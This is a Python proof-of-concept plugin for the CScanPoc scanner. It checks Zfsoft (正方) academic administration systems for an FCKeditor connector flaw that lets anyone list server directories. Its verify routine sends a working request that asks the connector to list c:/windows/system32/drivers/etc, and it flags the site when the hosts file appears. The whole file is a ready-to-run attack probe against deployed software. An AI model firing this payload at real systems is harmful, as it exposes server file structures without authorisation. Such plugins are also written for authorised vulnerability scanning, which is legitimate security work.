# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zfsoft_0102'  # 平台漏洞编号
    name = '正方软件教务系统fckeditor任意文件便利问题'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2012-07-31'  # 漏洞公布时间
    desc = '''
    fckeditor为了方正系统根目录的fckeditor文件夹中，调用默认的connectors接口即可遍历文件，即访问。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=8356
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '正方教务管理系统'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '846badf7-7467-4855-b138-450fe3db44c3'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=c:/windows/system32/drivers/etc"
            url = self.target + payload
            response = requests.get(url)
            if "localhost" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
